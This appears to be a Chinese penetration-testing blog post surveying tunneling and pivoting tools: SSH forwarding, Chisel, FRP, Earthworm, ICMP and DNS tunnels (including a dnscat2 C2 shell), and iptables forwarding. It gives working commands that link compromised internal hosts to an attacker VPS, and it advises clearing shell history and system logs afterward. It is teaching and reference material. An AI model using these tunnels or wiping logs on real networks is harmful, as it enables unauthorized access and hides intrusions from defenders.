---
title: 内网穿透与隧道技术汇总
date: 2025-07-04 05:42:42
tags:
  - 内网渗透
  - 渗透测试
description: 内网穿透与隧道技术——SSH 转发、Chisel/FRP、ICMP/DNS 隧道与 ProxyChains。
categories: 渗透测试
---

## 前言

在内网渗透中，突破网络隔离、建立持久访问通道是核心挑战。由于防火墙、NAT 与 ACL 限制，直接访问内网通常不可行。隧道与代理技术通过在两端建立加密或伪装通道，将内网流量中继到外网，实现"内网穿透"。本文系统梳理渗透测试中常用的隧道手段，涵盖 SSH 端口转发、Chisel、FRP、Earthworm、ICMP/DNS 隧道、iptables 转发及配套代理工具，并提供选型参考与实战示例。

---

## 1. SSH 端口转发

SSH 是最基础的隧道工具，几乎存在于所有 Linux/Unix 系统。

### 1.1 本地转发（-L）
将本地端口流量通过 SSH 转发到目标内网主机。

```bash
# 本机 8080 → 跳板机 10.0.0.5 → 内网 192.168.1.100:80
ssh -L 8080:192.168.1.100:80 root@10.0.0.5
# 访问 http://127.0.0.1:8080 即访问内网 Web
```

### 1.2 远程转发（-R）
将跳板机端口流量反向转发至本地内网——突破入站防火墙。

```bash
# 在内网主机执行：VPS 4444 → 内网 192.168.1.50:3389
ssh -R 4444:192.168.1.50:3389 root@vps.example.com
# 在 VPS 上：rdesktop 127.0.0.1:4444

# 配合 autossh 保活
autossh -M 5555 -NfR 4444:192.168.1.50:3389 root@vps.example.com
```

### 1.3 动态转发（-D）
本地启动 SOCKS5 代理，所有流量经 SSH 隧道动态路由。

```bash
ssh -D 1080 root@10.0.0.5
# 配合 ProxyChains：proxychains4 nmap -sT -Pn 192.168.1.0/24
```

**常用参数：** `-N`(不执行命令) `-f`(后台) `-T`(禁用伪终端) `-C`(压缩) `-g`(允许远程连接)

---

## 2. Chisel — 快速反向隧道

[Chisel](https://github.com/jpillora/chisel) 是 Go 编写的单二进制隧道工具，跨平台，适合无 SSH 环境的快速穿透。

**反向 SOCKS5：**
```bash
# VPS 服务端
./chisel server -p 8000 --reverse

# 内网客户端 → VPS 1080 即为 SOCKS5 入口
./chisel client vps.example.com:8000 R:0.0.0.0:1080:socks
```

**反向端口映射（RDP 出网）：**
```bash
./chisel client vps.example.com:8000 R:3389:192.168.1.100:3389
```

**多层穿透：** 边界主机 `R:1080:socks` → 深层主机 `./chisel client 192.168.1.50:1080 socks`

---

## 3. FRP — 高性能内网穿透

[FRP](https://github.com/fatedier/frp) 支持 TCP/UDP/HTTP/HTTPS/STCP，配置灵活，适合长稳代理。

**服务端 frps.ini：**
```ini
[common]
bind_port = 7000
dashboard_port = 7500
token = YourStrongToken123
```

**客户端 frpc.ini — TCP + SOCKS5：**
```ini
[common]
server_addr = vps.example.com
server_port = 7000
token = YourStrongToken123

[tcp-rdp]
type = tcp
local_ip = 192.168.1.100
local_port = 3389
remote_port = 13389

[socks5-proxy]
type = tcp
remote_port = 11080
plugin = socks5
```

启动：`./frps -c frps.ini` / `./frpc -c frpc.ini`

---

## 4. Earthworm (EW) — 经典 SOCKS5 级联

**正向（目标外网可达）：** `./ew -s ssocksd -l 1080`（攻击机直接 socks5://target_ip:1080）

**反向（目标内网，穿透防火墙）：**
```bash
# VPS
./ew -s rcsocks -l 1080 -e 8888

# 内网主机
./ew -s rssocks -d vps.example.com -e 8888
```

**二级级联（深度内网无法出网）：**
```bash
# VPS
./ew -s lcx_listen -l 1080 -e 8888
# 边界主机 A（可出网，连接 VPS 与深层 B）
./ew -s lcx_slave -d vps.example.com -e 8888 -f 192.168.100.50 -g 9999
# 深层主机 B（不可出网）
./ew -s ssocksd -l 9999
```
拓扑：`攻击机 → VPS:1080 → 边界A:8888 → 深层B:9999 → 核心区域`

---

## 5. ProxyChains 与 SocksCap

### 5.1 ProxyChains（Linux）
通过 LD_PRELOAD 劫持 syscall，将任意程序 TCP 流量经过代理链。

```ini
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains4 nmap -sT -Pn 192.168.1.0/24
proxychains4 msfconsole
```
> **注意：** 无法代理 ICMP/SYN，Nmap 必须用 `-sT`（全连接扫描）。

### 5.2 SocksCap64（Windows）
通过 Hook WinSock 将程序流量重定向至 SOCKS。将目标程序（mstsc.exe、浏览器）拖入启动即可。勾选 "Resolve DNS remotely" 防止 DNS 泄漏。替代方案：Proxifier、Netch。

---

## 6. ICMP 隧道 — ptunnel

当防火墙仅放行 ICMP 时，将 TCP 数据封装在 ICMP Echo 载荷中。

```bash
# 服务端（VPS）
ptunnel -x StrongPass

# 客户端（内网）— 将 VPS 2222 映射到内网 192.168.1.100:22
ptunnel -p vps.example.com -lp 2222 -da 192.168.1.100 -dp 22 -x StrongPass
# ssh root@127.0.0.1 -p 2222 即可连接
```
> 速度慢（每个包需等待 reply），适合 Shell 交互，不适合大文件传输。

---

## 7. DNS 隧道

DNS 隧道是仅 UDP 53 放行时的最后手段——将数据封装在 DNS 请求/响应中。

### 7.1 dnscat2（高隐蔽性、C2 专用）
```bash
# 服务端
dnscat2-server your-domain.com

# 客户端（Linux）
./dnscat2 --dns server=vps.example.com,domain=your-domain.com

# 客户端（Windows PowerShell）
Start-Dnscat2 -Domain your-domain.com -DNSServer vps.example.com

# 连接后
session -i 1                    # 交互 Shell
listen 127.0.0.1:4444 192.168.1.100:3389  # 端口转发
```

### 7.2 iodine（高速 DNS 隧道）
```bash
# 服务端（VPS，需 NS 记录指向本机）
iodined -f -P SecretPass 10.0.0.1/24 tunnel.your-domain.com

# 客户端（内网，连接后获得 10.0.0.2）
iodine -f -P SecretPass vps.example.com tunnel.your-domain.com

# 直接访问隧道对端：ssh root@10.0.0.2
```

| 工具 | 速度 | 隐蔽性 | 适用 |
|------|------|--------|------|
| dnscat2 | ~1-5 KB/s | 高（加密） | 低速 C2、Shell |
| iodine | ~100-680 KB/s | 中（可检测） | 文件传输、代理 |

---

## 8. iptables 端口转发

利用已控 Linux 主机做路由跳板，无需额外工具。

```bash
# 开启转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 将本机 2222 → 内网 192.168.1.100:22
iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.1.100:22
iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.100 --dport 22 -j MASQUERADE
```

**跨网段转发（双网卡主机）：**
```bash
# eth0:10.0.0.5(外), eth1:192.168.10.5(内) → 深层 192.168.20.0/24
ip route add 192.168.20.0/24 via 192.168.10.1 dev eth1
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 -j DNAT --to-destination 192.168.20.100:3389
iptables -t nat -A POSTROUTING -d 192.168.20.100 -j MASQUERADE
iptables -A FORWARD -p tcp -d 192.168.20.100 --dport 3389 -j ACCEPT
```

**无 root 替代 — socat：** `socat TCP-LISTEN:2222,fork,reuseaddr TCP:192.168.1.100:22`

**Windows netsh：** `netsh interface portproxy add v4tov4 listenport=3389 connectaddress=192.168.1.100 connectport=3389`

---

## 9. 隧道技术全景对比

| 隧道类型 | 工具 | 协议层 | 出网条件 | 速度 | 隐蔽性 | 复杂环境适应性 | 推荐场景 |
|----------|------|--------|----------|------|--------|---------------|----------|
| SSH 转发 | OpenSSH | L4 | TCP 22 | 高 | 低 | 中 | 首选方案，有 SSH 即可 |
| HTTP(S) | FRP | L7 | TCP 80/443 | 高 | 中 | 高 | 长稳代理、多协议穿透 |
| TCP 隧道 | Chisel | L4 | 任意 TCP | 高 | 中 | 高 | 快速隧道，无 SSH 时 |
| SOCKS5 级联 | EW | L4 | 任意 TCP | 中 | 中 | 高 | 多级内网级联 |
| ICMP 隧道 | ptunnel | L3 | ICMP | 低 | 中 | 低 | 仅 ICMP 放行 |
| DNS 隧道 | dnscat2/iodine | L7 | UDP 53 | 极低~低 | 高 | 中 | 仅 DNS 放行 / 高隐蔽 |
| 路由转发 | iptables | L3 | 无需出网 | 高 | 高 | 低(需root) | 内网横向跳板 |

### 隧道选型决策流程

```
                           ┌──────────────────┐
                           │ 目标是否可以出网？  │
                           └────────┬─────────┘
                                    │
                       ┌────────────┴────────────┐
                       ▼                         ▼
                  【可出网】                  【不可出网】
              出网协议是什么？          利用已控边界主机转发
              │    │    │    │        (iptables / EW 级联)
            TCP22 TCP80 ICMP DNS
              │    │    │    │
              ▼    ▼    ▼    ▼
            SSH  FRP  ptunnel dnscat2
                    Chisel       iodine
```

---

## 10. 实战组合：多层内网穿透

```
场景：最内层仅 DNS 出网，经过两道隔离
Internet → VPS(FRP) → 边界Web(FRPC+EW) → 内层DB(DNS隧道)
```

**Step 1 — VPS：** `./frps -c frps.ini`

**Step 2 — 边界主机：**
```bash
./frpc -c frpc.ini        # 连接 VPS，暴露 SOCKS5
./ew -s ssocksd -l 2080   # 对内开放 SOCKS5 供深层使用
```

**Step 3 — 深层主机：**
```bash
./dnscat2 --dns server=192.168.1.50,domain=inner.tunnel.local
```

---

## 11. 稳定性优化

- **心跳保活：** SSH `ServerAliveInterval=60`；FRP `heartbeat_timeout=30`
- **自动重连：** autossh（SSH）、systemd service / supervisor（FRP/Chisel）
- **流量压缩加密：** SSH `-C`、FRP `use_encryption=true`、Chisel 自带加密
- **进程守护：** `nohup cmd &`（临时）、systemd（长稳）
- **日志清理：** 操作完成后清理 `~/.bash_history` 及 `/var/log/` 相关记录（授权范围内操作请遵循规范）

---

## 12. 免责声明

> **本文所述技术仅供授权的安全测试、教学研究及网络运维学习使用。**
>
> - 未经目标系统所有者明确授权，严禁利用隧道或代理技术对他人网络进行访问、测试或攻击。
> - 使用者须遵守《中华人民共和国网络安全法》《刑法》第285/286条及相关法律法规，违法行为将承担法律责任。
> - 本文作者不对任何滥用本文技术造成的后果负责。
> - 授权渗透测试中应遵循最小影响原则，测试完毕后及时清理隧道与日志。

---

## 参考资料

- [OpenSSH Manual](https://man.openbsd.org/ssh)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [FRP GitHub](https://github.com/fatedier/frp)
- [Earthworm](https://rootkiter.com/EarthWorm/)
- [dnscat2 GitHub](https://github.com/iagox86/dnscat2)
- [iodine GitHub](https://github.com/yarrick/iodine)
- [ptunnel](http://www.cs.uit.no/~daniels/PingTunnel/)
- [MITRE ATT&CK T1572 — Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
